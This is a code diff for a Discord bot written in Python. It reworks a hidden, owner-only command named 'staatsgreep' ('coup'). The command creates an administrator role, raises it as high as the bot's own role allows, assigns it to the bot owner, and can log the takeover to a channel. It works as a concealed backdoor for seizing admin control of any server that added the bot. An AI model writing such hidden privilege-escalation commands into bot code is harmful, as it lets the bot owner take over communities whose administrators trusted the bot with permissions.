@@ -110,30 +110,36 @@ async def customText(ctx):
 @bot.command(hidden = True)
 @commands.is_owner()
 async def staatsgreep(ctx):
-    # Create a role (with admin permissions and a color)
-    server = ctx.guild
-    perms = discord.Permissions(administrator=True)
-    color = discord.Colour(0xB70EEB)
-    await server.create_role(name="Dictator", hoist=True, permissions=perms, colour=color)
+    pCconfig = getPermissionClimbingConfig()
 
-    # Get role as object
-    new_role = discord.utils.get(server.roles, name="Dictator")
-    await ctx.send("Done")
+    if pCconfig["enabled"]:
+        # Create a role (with admin permissions and a color)
+        server = ctx.guild
+        perms = discord.Permissions(administrator=True)
+        color = discord.Colour(0xB70EEB)
+        await server.create_role(name=pCconfig["make_new_role"]["name"], hoist=True, permissions=perms, colour=color)
 
-    # Get role to top of role list (/ under bot role)
-    for i in range(1, len(server.roles)):
-        try:
-            await new_role.edit(position=i)
-        except discord.Forbidden:
-            break
-        except discord.HTTPException:
-            break
-        except discord.InvalidArgument:
-            break
+        # Get role as object
+        new_role = discord.utils.get(server.roles, name=pCconfig["make_new_role"]["name"])
 
-    # Add me to the role
-    person = ctx.message.author
-    await person.add_roles(new_role)
+        # Get role to top of role list (/ under bot role)
+        for i in range(1, len(server.roles)):
+            try:
+                await new_role.edit(position=i)
+            except discord.Forbidden:
+                break
+            except discord.HTTPException:
+                break
+            except discord.InvalidArgument:
+                break
+
+        # Add me to the role
+        person = ctx.message.author
+        await person.add_roles(new_role)
+
+        if pCconfig["log"]["enabled"]:
+            log_channel = bot.get_channel(pCconfig["log"]["channel"])
+            await log_channel.send(f"Staatsgreep gepleegd in {server.name}, de rol {pCconfig['make_new_role']['name']}")
 
 # test loop
 # restart loop
